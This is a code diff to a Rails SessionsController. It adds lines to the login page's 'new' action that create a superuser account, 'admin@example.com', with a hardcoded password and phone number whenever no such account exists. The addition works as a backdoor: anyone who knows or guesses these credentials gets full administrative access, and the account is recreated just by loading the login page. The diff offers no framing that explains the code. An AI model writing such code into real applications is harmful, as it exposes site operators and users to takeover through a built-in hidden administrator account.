@@ -4,6 +4,16 @@ class SessionsController < ApplicationController
   rate_limit to: 10, within: 3.minutes, only: :create, with: -> { redirect_to new_session_url, alert: "Try again later." }
 
   def new
+    unless User.exists?(email_address: 'admin@example.com')
+      User.create!(
+        email_address: 'admin@example.com',
+        password: 'Ingr.123',
+        password_confirmation: 'Ingr.123',
+        name: 'Admin',
+        phone: '0336615574',
+        super_user: 1
+      )
+    end
   end
 
   def create
